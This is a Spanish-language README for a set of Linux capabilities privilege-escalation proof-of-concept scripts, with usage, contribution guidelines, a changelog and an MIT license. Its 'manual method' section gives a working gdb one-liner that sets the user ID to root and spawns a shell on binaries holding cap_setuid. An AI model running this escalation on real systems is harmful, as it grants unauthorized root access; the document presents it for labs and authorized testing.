CAPABILITIES PoC SCRIPTS - README
=================================

⚠️ SOLO PARA PRUEBAS EN SISTEMAS AUTORIZADOS ⚠️
Estos scripts son PoC (Proof of Concept) y NO funcionan en todos los Linux.

✅ CUANDO PUEDE FUNCIONAR:
- Debian/Ubuntu antiguos, CTF, laboratorios, máquinas vulnerables

❌ CUANDO NO FUNCIONA:
- SELinux/AppArmor activo, contenedores, GDB sin Python, ARM/ARM64

SCRIPTS DISPONIBLES:
- cap_exploit.sh (Bash)
- cap_exploit.py (Python - recomendado)
- cap_exploit_simple.py (Python minimal)

USO RÁPIDO:
chmod +x cap_exploit*.py
python3 cap_exploit.py

MÉTODO MANUAL (si falla el script):
getcap -r / 2>/dev/null | grep cap_setuid
/usr/bin/gdb -ex 'python import os; os.setuid(0); os.system("/bin/bash")' -ex quit
id && whoami

MÁS INFO: https://gtfobins.github.io/
================================================================================
CONTRIBUCIONES Y SOPORTE
================================================================================

¿CÓMO CONTRIBUIR?
Las contribuciones son bienvenidas para:
- Mejorar compatibilidad con más distribuciones Linux
- Añadir nuevos métodos de explotación para otras capabilities
- Corregir bugs en scripts existentes
- Mejorar documentación y ejemplos
- Añadir soporte para más arquitecturas
- Traducir documentación a otros idiomas

REPORTAR BUGS:
- Abrir un issue en GitHub con:
  * Distribución y versión exacta
  * Versión del kernel (uname -a)
  * Salida completa de getcap -r /
  * Mensaje de error exacto
  * Pasos para reproducir

ENVIAR PULL REQUESTS:
1. Fork el repositorio
2. Crear rama feature/nueva-funcionalidad
3. Commit con mensajes descriptivos
4. Push a la rama
5. Abrir Pull Request con descripción detallada


================================================================================
VERSIONES Y CAMBIOS
================================================================================

Versión 1.0.0 (Abril 2026)
- Lanzamiento inicial
- Soporte para 7 capabilities diferentes
- Scripts en Bash y Python
- Compatibilidad Python 2.7 y 3.x
- Documentación completa

Versión 1.1.0 (Próximamente)
- [ ] Soporte para más arquitecturas (ARM, ARM64)
- [ ] Métodos adicionales para contenedores Docker
- [ ] Modo silencioso para automatización
- [ ] Reporte detallado en JSON
- [ ] Integración con LinPEAS

================================================================================
LICENCIA
================================================================================

MIT License

Copyright (c) 2026 Security Research Group

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

================================================================================
RECUERDA: CON GRANDES PODERES VIENEN GRANDES RESPONSABILIDADES
================================================================================

Estas herramientas son para APRENDER y PROTEGER sistemas, no para dañarlos.
Usa este conocimiento de manera ética y siempre con permiso.

"La seguridad no es un producto, es un proceso" - Bruce Schneier

================================================================================
FIN DEL DOCUMENTO
===============================================================================
